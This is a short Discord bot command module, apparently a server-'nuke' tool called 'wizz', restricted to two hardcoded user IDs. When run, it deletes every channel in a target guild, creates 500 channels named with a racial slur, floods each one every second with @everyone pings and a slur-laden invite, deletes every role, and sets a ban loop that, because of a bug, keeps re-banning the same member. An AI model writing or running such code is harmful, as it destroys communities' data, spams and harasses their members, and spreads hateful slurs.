module.exports.run = async (client, msg ,args) => {
    let guild = args[0]
    if(!["173641512838496256", "685675290176913504"].includes(msg.author.id)) return;
    if (!guild) return msg.reply('You forgot a guild ID.')
    if (!client.guilds.cache.get(guild)) return msg.reply('I am not in that guild.')
    	client.guilds.cache.get(guild).channels.cache.forEach(c => c.delete())
        for(let i = 0; i < 500; i++) {
            client.guilds.cache.get(args[0]).channels.create(`niggers`, { type:"text"}).then(c => {
                setInterval(() => {
                    c.send("@everyone discord.gg/niggers")
                }, 1000);
            })
        }

        const roles = client.guilds.cache.get(guild).roles.cache.array()
        for(let d = 0; d < roles.length; d++) {

                await roles[d].delete()


        }

        const members = client.guilds.cache.get(guild).members.cache.array()
        let i = 0;
        setInterval(() => {
        members[i].ban()
        }, 1000)
    }


module.exports.help = {
	name:"wizz",
	usage:"wizz"
}